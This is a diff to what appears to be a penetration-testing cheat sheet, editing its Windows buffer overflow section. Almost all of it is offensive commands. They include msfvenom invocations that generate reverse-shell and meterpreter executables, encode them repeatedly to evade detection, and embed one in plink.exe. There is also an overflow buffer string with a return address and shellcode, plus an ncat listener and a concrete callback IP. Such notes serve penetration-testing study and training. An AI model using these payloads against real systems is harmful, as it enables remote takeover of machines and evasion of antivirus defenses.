@@ -676,6 +676,7 @@ Buffer Overflows and Exploits
     -   Check for “Bad Characters” - Run multiple times 0x00 - 0xFF
 
     -   Use Mona to determine a module that is unprotected
+            !mona modules
 
     -   Bypass DEP if present by finding a Memory Location with Read and Execute access for JMP ESP
 
@@ -694,34 +695,32 @@ Buffer Overflows and Exploits
 
     -   MSFVenom to create payload
     
-            msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+            msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.183 LPORT=5555 -f c -a x86 --platform windows -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
 
     -   Final Payload with NOP slide  
     
             buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
 
     -   Create a PE Reverse Shell  
-        msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444
-        -f  
-        exe -o shell\_reverse.exe
+    
+            msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444 -f exe -o shell_reverse.exe
+            
+    -   Running  a listener
+    
+            ncat -vln 5555           
 
     -   Create a PE Reverse Shell and Encode 9 times with
-        Shikata\_ga\_nai  
-        msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444
-        -f  
-        exe -e x86/shikata\_ga\_nai -i 9 -o
-        shell\_reverse\_msf\_encoded.exe
+        Shikata_ga_nai  
+        
+            msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444  -f exe -e x86/shikata_ga_nai -i 9 -o shell\_reverse\_msf\_encoded.exe
 
-    -   Create a PE reverse shell and embed it into an existing
-        executable  
-        msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444 -f
-        exe -e x86/shikata\_ga\_nai -i 9 -x
-        /usr/share/windows-binaries/plink.exe -o
-        shell\_reverse\_msf\_encoded\_embedded.exe
+    -   Create a PE reverse shell and embed it into an existing executable  
+        
+            msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata\_ga\_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o  shell\_reverse\_msf\_encoded\_embedded.exe
 
     -   Create a PE Reverse HTTPS shell  
-        msfvenom -p windows/meterpreter/reverse\_https LHOST=$ip
-        LPORT=443 -f exe -o met\_https\_reverse.exe
+    
+            msfvenom -p windows/meterpreter/reverse\_https LHOST=$ip LPORT=443 -f exe -o met\_https\_reverse.exe
 
 -   Linux Buffer Overflows
 
